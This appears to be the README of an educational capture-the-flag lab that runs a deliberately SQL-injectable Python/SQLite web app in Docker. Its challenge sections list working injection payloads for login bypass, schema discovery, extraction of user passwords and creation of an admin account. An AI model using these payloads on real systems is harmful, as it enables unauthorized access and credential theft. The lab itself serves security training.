# CTF Lab - SQL Injection Challenge

This is an educational CTF lab designed to teach SQL injection vulnerabilities. The application is a Python web application with a SQLite backend that contains intentional security vulnerabilities for learning purposes.

## 🎯 Learning Objectives

- Understand SQL injection vulnerabilities
- Learn to identify vulnerable input fields
- Practice SQL injection techniques
- Understand the impact of SQL injection attacks
- Learn about database structure discovery

## 🚀 Quick Start

### Option 1: Docker Compose (Recommended)
```bash
# Clone this repository
git clone <repository-url>
cd ctf-sql-injection-lab

# Run the CTF lab
docker-compose up -d

# Access at http://localhost:5000
```

### Option 2: Docker Run
```bash
# Build the image
docker build -t ctf-sql-injection-lab .

# Run the CTF lab
docker run -p 5000:5000 ctf-sql-injection-lab

# Access at http://localhost:5000
```

## 🎮 CTF Challenges

### Challenge 1: Authentication Bypass
**Objective**: Log in without valid credentials using SQL injection.

**Hint**: The login form is vulnerable to SQL injection. Try using special characters in the username field.

**Payload Examples**:
- `testuser' OR '1'='1' --`
- `' OR 1=1 --`
- `testuser' OR 1=1 --`

### Challenge 2: Database Schema Discovery
**Objective**: Discover the database structure and table names.

**Hint**: Use the search function to execute UNION-based SQL injection queries.

**Payload Examples**:
- `' UNION SELECT sql, 'table', 'structure' FROM sqlite_master --`
- `' UNION SELECT name, 'table', 'type' FROM sqlite_master WHERE type='table' --`

### Challenge 3: Data Extraction
**Objective**: Extract sensitive information like usernames and passwords.

**Hint**: Use UNION queries to extract data from the users table.

**Payload Examples**:
- `' UNION SELECT username, password, 'admin' FROM users --`
- `' UNION SELECT username, 'password', 'hash' FROM users WHERE is_admin=1 --`

### Challenge 4: Admin Privilege Escalation
**Objective**: Gain admin privileges by manipulating the database.

**Hint**: Try to modify user privileges or create a new admin user.

**Payload Examples**:
- `'; UPDATE users SET is_admin=1 WHERE username='testuser' --`
- `'; INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'password', 1) --`

## 🏗️ Application Structure

- **Login System**: Vulnerable to SQL injection in username/password fields
- **Search Function**: Vulnerable to SQL injection in search query parameter
- **Admin Panel**: Accessible to users with admin privileges
- **Message System**: Allows posting and viewing messages
- **User Management**: Admin can view and delete users

## 📚 Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQL Injection Tutorial](https://portswigger.net/web-security/sql-injection)
- [SQLite Documentation](https://www.sqlite.org/docs.html)

## ⚠️ Disclaimer

This lab is for educational purposes only. The vulnerabilities are intentionally included for learning. Do not use these techniques on systems you don't own or have explicit permission to test.


Good luck and happy hacking! 🚀
